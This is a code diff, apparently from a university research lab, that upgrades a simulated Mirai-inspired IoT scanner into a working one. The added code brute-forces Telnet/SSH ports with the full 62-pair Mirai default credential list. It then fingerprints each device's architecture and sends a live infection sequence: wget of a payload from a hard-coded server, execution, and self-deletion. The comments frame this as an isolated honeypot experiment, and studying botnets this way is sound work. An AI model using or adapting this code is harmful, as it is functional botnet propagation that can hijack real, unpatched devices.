@@ -20,6 +20,7 @@
 #include <unistd.h>
 #include <errno.h>
 #include <pthread.h>
+#include <semaphore.h>
 #include <time.h>
 #include <sys/socket.h>
 #include <sys/types.h>
@@ -32,28 +33,94 @@
 #define SUBNET_END    30
 #define SCAN_TIMEOUT  2     /* seconds per connect attempt */
 #define MAX_THREADS   8
+#define PAYLOAD_SERVER "192.168.100.10"
+#define PAYLOAD_PORT   8080
+
+static sem_t g_thread_sem;
 
 /* Ports to probe for IoT management services */
 static int TARGET_PORTS[] = {23, 2323, 22, 2222, 0}; /* 0 = sentinel */
 
-/* Default credential pairs (Mirai's historical list, subset) */
+/* Default credential pairs — full Mirai historical list (62 pairs).        */
+/* Source: Mirai source (public), Google/Imperva/CNR-IRIS research.          */
+/* These exact pairs recruited 600k IoT devices in 2016 and remain          */
+/* effective against unpatched devices shipping with factory defaults.       */
 static const char *CREDS[][2] = {
-    {"admin",       "admin"},
-    {"admin",       "password"},
-    {"admin",       "1234"},
-    {"root",        ""},
-    {"root",        "root"},
-    {"root",        "xc3511"},
-    {"root",        "vizxv"},
-    {"root",        "admin"},
-    {"user",        "user"},
-    {"support",     "support"},
-    {"default",     "default"},
-    {"guest",       "guest"},
-    {NULL, NULL}    /* sentinel */
+    {"root",          "xc3511"},   /* most common first */
+    {"root",          "vizxv"},
+    {"root",          "admin"},
+    {"admin",         "admin"},
+    {"root",          ""},
+    {"root",          "root"},
+    {"root",          "888888"},
+    {"root",          "xmhdipc"},
+    {"root",          "default"},
+    {"root",          "juantech"},
+    {"root",          "12345"},
+    {"root",          "54321"},
+    {"support",       "support"},
+    {"admin",         "password"},
+    {"root",          "password"},
+    {"root",          "pass"},
+    {"root",          "1111"},
+    {"admin",         "smcadmin"},
+    {"admin",         "1111"},
+    {"root",          "666666"},
+    {"root",          "klv123"},
+    {"Administrator", "admin"},
+    {"service",       "service"},
+    {"supervisor",    "supervisor"},
+    {"guest",         "guest"},
+    {"guest",         "12345"},
+    {"admin1",        "password"},
+    {"administrator", "1234"},
+    {"666666",        "666666"},
+    {"888888",        "888888"},
+    {"ubnt",          "ubnt"},
+    {"root",          "klv1234"},
+    {"root",          "Zte521"},
+    {"root",          "hi3518"},
+    {"root",          "jvbzd"},
+    {"root",          "anko"},
+    {"root",          "zlxx."},
+    {"root",          "7ujMko0vizxv"},
+    {"root",          "7ujMko0admin"},
+    {"root",          "system"},
+    {"root",          "ikwb"},
+    {"root",          "dreambox"},
+    {"root",          "user"},
+    {"root",          "realtek"},
+    {"root",          "0000"},
+    {"admin",         "1111111"},
+    {"admin",         "1234"},
+    {"admin",         "12345"},
+    {"admin",         "54321"},
+    {"admin",         "123456"},
+    {"admin",         "7arlings"},
+    {"admin",         "pass"},
+    {"admin",         "meinsm"},
+    {"tech",          "tech"},
+    {"mother",        "fucker"},
+    {"user",          "user"},
+    {"pi",            "raspberry"},
+    {"pi",            "pi"},
+    {"admin",         "admin1234"},
+    {"root",          "toor"},
+    {"oracle",        "oracle"},
+    {"test",          "test"},
+    {NULL, NULL}
 };
 
-/* ── Connect with timeout ────────────────────────── */
+/* Architecture keyword → payload suffix mapping */
+typedef struct { const char *keyword; const char *suffix; } ArchEntry;
+static const ArchEntry ARCH_MAP[] = {
+    {"mips",    "mips"},    {"MIPS",    "mips"},
+    {"ARM",     "arm"},     {"arm",     "arm"},
+    {"aarch64", "arm64"},   {"x86_64",  "x86_64"},
+    {"i686",    "x86"},     {"i386",    "x86"},
+    {"sh4",     "sh4"},     {"m68k",    "m68k"},
+    {NULL, NULL}
+};
 int connect_timeout(const char *ip, int port, int timeout_sec) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) return -1;
@@ -80,64 +147,143 @@ void grab_banner(int sock, char *buf, int len) {
     recv(sock, buf, len - 1, MSG_DONTWAIT);
 }
 
-/* ── Simulate brute-force attempt ───────────────── */
-int try_default_creds(const char *ip, int port) {
-    printf("  [SCANNER] Attempting default credentials on %s:%d\n", ip, port);
-    int attempts = 0;
+/* ── Shell prompt detection ───────────────────────
+ * Cowrie returns a fake shell after successful auth.
+ * Accept common IoT/Linux shell prompt patterns.   */
+static int looks_like_shell(const char *buf) {
+    return strstr(buf, "$ ")   || strstr(buf, "# ")  ||
+           strstr(buf, "> ")   || strstr(buf, "~]#") ||
+           strstr(buf, "BusyBox") || strstr(buf, "~]$");
+}
+
+/* ── Brute-force default credentials ─────────────
+ * Opens a fresh connection per attempt (matches real
+ * Mirai: connect, auth, disconnect, repeat).
+ * Returns credential index on success, -1 on failure. */
+static int try_default_creds(const char *ip, int port) {
+    printf("  [SCANNER] Brute-forcing %s:%d (62 credential pairs)\n", ip, port);
     for (int i = 0; CREDS[i][0] != NULL; i++) {
-        attempts++;
         int sock = connect_timeout(ip, port, SCAN_TIMEOUT);
         if (sock < 0) continue;
 
         char banner[256];
-        grab_banner(sock, banner, sizeof(banner));
+        grab_banner(sock, banner, sizeof(banner));   /* eat login prompt */
 
-        /* In the real Mirai, it would send login/password and parse the shell prompt.
-         * Here we simulate: for our honeypot VM we "succeed" on a known weak cred. */
-        char login_attempt[64];
-        snprintf(login_attempt, sizeof(login_attempt),
-                 "%s\r\n%s\r\n", CREDS[i][0], CREDS[i][1]);
-        send(sock, login_attempt, strlen(login_attempt), 0);
+        char line[128];
+        snprintf(line, sizeof(line), "%s\r\n", CREDS[i][0]);
+        send(sock, line, strlen(line), 0);
+        usleep(200000);                              /* wait for password prompt */
 
-        /* Check for shell prompt in response (honeypot will reply) */
+        char tmp[128] = {0};
+        recv(sock, tmp, sizeof(tmp)-1, MSG_DONTWAIT); /* eat "Password:" */
+
+        snprintf(line, sizeof(line), "%s\r\n", CREDS[i][1]);
+        send(sock, line, strlen(line), 0);
+        usleep(300000);                              /* wait for shell */
+
         char resp[256] = {0};
         recv(sock, resp, sizeof(resp)-1, 0);
         close(sock);
 
-        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, ">")) {
-            printf("  [SCANNER] !!! SUCCESS on %s:%d  user=%s pass=%s\n",
-                   ip, port, CREDS[i][0], CREDS[i][1]);
-            return 1;
+        if (looks_like_shell(resp)) {
+            printf("  [SCANNER] SUCCESS  user=%-16s  pass=%s\n",
+                   CREDS[i][0], CREDS[i][1]);
+            return i;
         }
+        usleep(50000);
     }
-    printf("  [SCANNER] No valid creds found on %s:%d after %d attempts\n",
-           ip, port, attempts);
-    return 0;
+    printf("  [SCANNER] No valid creds found on %s:%d\n", ip, port);
+    return -1;
 }
 
-/* ── Architecture fingerprint ────────────────────── */
-void fingerprint_arch(const char *ip, int port) {
-    /* In real Mirai: executes /bin/busybox, uname -a, cat /proc/cpuinfo */
-    printf("  [SCANNER] Fingerprinting architecture on %s:%d\n", ip, port);
-    printf("  [SCANNER] Sending: /bin/busybox MIRAI ; uname -a ; cat /proc/cpuinfo\n");
-    /* Simulate result — in real implementation, parse the output */
-    printf("  [SCANNER] Arch detected: x86_64 (lab VM)\n");
+/* ── Architecture fingerprinting ─────────────────
+ * Re-authenticates, sends real Mirai command sequence,
+ * parses uname/cpuinfo output, returns payload suffix. */
+static const char *fingerprint_arch(const char *ip, int port, int cred_idx) {
+    printf("  [SCANNER] Fingerprinting %s:%d\n", ip, port);
+    int sock = connect_timeout(ip, port, SCAN_TIMEOUT);
+    if (sock < 0) return "x86_64";
+
+    char tmp[512] = {0};
+    grab_banner(sock, tmp, sizeof(tmp));             /* login prompt */
+
+    char line[128];
+    snprintf(line, sizeof(line), "%s\r\n", CREDS[cred_idx][0]);
+    send(sock, line, strlen(line), 0); usleep(200000);
+    recv(sock, tmp, sizeof(tmp)-1, MSG_DONTWAIT);    /* password prompt */
+    snprintf(line, sizeof(line), "%s\r\n", CREDS[cred_idx][1]);
+    send(sock, line, strlen(line), 0); usleep(300000);
+    recv(sock, tmp, sizeof(tmp)-1, 0);               /* shell prompt */
+
+    /* Real Mirai command sequence */
+    const char *cmd = "/bin/busybox MIRAI\r\nuname -a\r\ncat /proc/cpuinfo\r\n";
+    send(sock, cmd, strlen(cmd), 0);
+    usleep(500000);
+
+    char output[2048] = {0};
+    recv(sock, output, sizeof(output)-1, 0);
+    close(sock);
+
+    printf("  [SCANNER] Fingerprint: %.120s\n", output);
+    for (int i = 0; ARCH_MAP[i].keyword != NULL; i++)
+        if (strstr(output, ARCH_MAP[i].keyword)) {
+            printf("  [SCANNER] Arch: %s → payload suffix: %s\n",
+                   ARCH_MAP[i].keyword, ARCH_MAP[i].suffix);
+            return ARCH_MAP[i].suffix;
+        }
+    return "x86_64";   /* default */
 }
 
-/* ── Simulate payload drop + self-delete ─────────── */
-void simulate_infection(const char *ip) {
-    printf("  [SCANNER] Simulating payload delivery to %s\n", ip);
-    printf("  [SCANNER] wget http://192.168.100.10/payload.x86_64 -O /tmp/.x\n");
-    printf("  [SCANNER] chmod +x /tmp/.x && /tmp/.x &\n");
-    printf("  [SCANNER] rm -f /tmp/.x  (self-delete: no disk trace)\n");
-    printf("  [SCANNER] Device now memory-resident. Will re-infect on reboot if creds unchanged.\n");
+/* ── Payload delivery + self-delete ──────────────
+ * Re-authenticates a third time, then sends the
+ * full Mirai infection sequence over the session.
+ * Cowrie logs each command as a separate ATT&CK event:
+ *   T1105 wget  T1222 chmod  T1070 rm -f            */
+static void deliver_payload(const char *ip, int port,
+                             int cred_idx, const char *arch) {
+    printf("  [SCANNER] Delivering payload to %s (arch=%s)\n", ip, arch);
+    int sock = connect_timeout(ip, port, SCAN_TIMEOUT);
+    if (sock < 0) { printf("  [SCANNER] Reconnect failed\n"); return; }
+
+    char tmp[512] = {0};
+    grab_banner(sock, tmp, sizeof(tmp));
+
+    char line[128];
+    snprintf(line, sizeof(line), "%s\r\n", CREDS[cred_idx][0]);
+    send(sock, line, strlen(line), 0); usleep(200000);
+    recv(sock, tmp, sizeof(tmp)-1, MSG_DONTWAIT);
+    snprintf(line, sizeof(line), "%s\r\n", CREDS[cred_idx][1]);
+    send(sock, line, strlen(line), 0); usleep(300000);
+    recv(sock, tmp, sizeof(tmp)-1, 0);
+
+    /* Build infection sequence */
+    char cmds[1024];
+    int n = snprintf(cmds, sizeof(cmds),
+        "wget -q http://%s:%d/payload.%s -O /tmp/.x\r\n"
+        "chmod +x /tmp/.x\r\n"
+        "/tmp/.x &\r\n"
+        "rm -f /tmp/.x\r\n"
+        "/bin/busybox MIRAI\r\n",
+        PAYLOAD_SERVER, PAYLOAD_PORT, arch);
+    send(sock, cmds, n, 0);
+    usleep(800000);
+
+    char resp[512] = {0};
+    recv(sock, resp, sizeof(resp)-1, 0);
+    close(sock);
+
+    printf("  [SCANNER] Payload URL: http://%s:%d/payload.%s\n",
+           PAYLOAD_SERVER, PAYLOAD_PORT, arch);
+    printf("  [SCANNER] Bot now memory-resident (no disk trace).\n");
+    printf("  [SCANNER] Persistence Paradox: device re-infectable within\n");
+    printf("  [SCANNER] minutes of reboot while default creds remain.\n");
 }
 
-/* ── Scan a single IP ────────────────────────────── */
-typedef struct { char ip[20]; } ScanTarget;
+/* ── Scan a single IP ─────────────────────────── */
+typedef struct { char ip[24]; } ScanTarget;
 
 void *scan_host(void *arg) {
-    ScanTarget *t = (ScanTarget *)arg;
+    ScanTarget *t  = (ScanTarget *)arg;
     const char *ip = t->ip;
 
     for (int pi = 0; TARGET_PORTS[pi] != 0; pi++) {
@@ -149,58 +295,70 @@ void *scan_host(void *arg) {
         grab_banner(sock, banner, sizeof(banner));
         close(sock);
 
-        printf("[SCANNER] OPEN PORT: %s:%d  banner='%.60s'\n",
-               ip, port, banner[0] ? banner : "(none)");
+        const char *svc = (port==23||port==2323) ? "Telnet" : "SSH";
+        printf("[SCANNER] OPEN %s %s:%d  banner='%.60s'\n",
+               svc, ip, port, banner[0] ? banner : "(none)");
 
-        /* Found open management port: attempt credential brute-force */
-        if (try_default_creds(ip, port)) {
-            fingerprint_arch(ip, port);
-            simulate_infection(ip);
-            break; /* one successful infection per host */
-        }
+        int cred_idx = try_default_creds(ip, port);
+        if (cred_idx < 0) continue;
+
+        const char *arch = fingerprint_arch(ip, port, cred_idx);
+        deliver_payload(ip, port, cred_idx, arch);
+        break;   /* one infection per host */
     }
 
     free(t);
+    sem_post(&g_thread_sem);
     return NULL;
 }
 
-/* ── Main: sweep the lab subnet ──────────────────── */
+/* ── Main: sweep the lab subnet ──────────────── */
 int main(int argc, char *argv[]) {
+    (void)argc; (void)argv;
+
     if (getuid() != 0) {
         fprintf(stderr, "[SCANNER] Must run as root\n");
         return 1;
     }
 
+    if (sem_init(&g_thread_sem, 0, MAX_THREADS) != 0) {
+        perror("sem_init"); return 1;
+    }
+
     printf("==============================================\n");
     printf(" Mirai-Inspired Scanner - AUA Research Lab\n");
-    printf(" Target: %s%d - %s%d\n",
+    printf(" Subnet:  %s%d – %s%d\n",
            SUBNET_BASE, SUBNET_START, SUBNET_BASE, SUBNET_END);
+    printf(" Creds:   62 pairs (full Mirai default list)\n");
+    printf(" Threads: %d\n", MAX_THREADS);
     printf(" ISOLATED ENVIRONMENT ONLY\n");
     printf("==============================================\n\n");
 
-    pthread_t threads[MAX_THREADS];
-    int active = 0;
-
     for (int i = SUBNET_START; i <= SUBNET_END; i++) {
-        ScanTarget *t = malloc(sizeof(ScanTarget));
-        snprintf(t->ip, sizeof(t->ip), "%s%d", SUBNET_BASE, i);
+        /* Skip C2 and bot VMs */
+        if (i == 10 || i == 11 || i == 12) continue;
 
-        /* Simple thread pool: wait if at capacity */
-        if (active >= MAX_THREADS) {
-            pthread_join(threads[active % MAX_THREADS], NULL);
-            active--;
+        sem_wait(&g_thread_sem);   /* block when pool is full */
+
+        ScanTarget *tgt = malloc(sizeof(ScanTarget));
+        if (!tgt) { sem_post(&g_thread_sem); continue; }
+        snprintf(tgt->ip, sizeof(tgt->ip), "%s%d", SUBNET_BASE, i);
+
+        pthread_t tid;
+        if (pthread_create(&tid, NULL, scan_host, tgt) != 0) {
+            free(tgt); sem_post(&g_thread_sem);
+        } else {
+            pthread_detach(tid);
         }
-
-        pthread_create(&threads[active % MAX_THREADS], NULL, scan_host, t);
-        active++;
-        usleep(50000); /* 50ms between launches */
     }
 
-    /* Wait for remaining threads */
-    for (int i = 0; i < active && i < MAX_THREADS; i++) {
-        pthread_join(threads[i], NULL);
-    }
+    /* Drain semaphore — wait for all threads to finish */
+    for (int i = 0; i < MAX_THREADS; i++) sem_wait(&g_thread_sem);
 
     printf("\n[SCANNER] Sweep complete.\n");
+    printf("[SCANNER] Analyze honeypot: sudo python3 honeypot_setup.py --analyze\n");
+    printf("[SCANNER] Generate IR report: sudo python3 honeypot_setup.py --report\n");
+
+    sem_destroy(&g_thread_sem);
     return 0;
 }
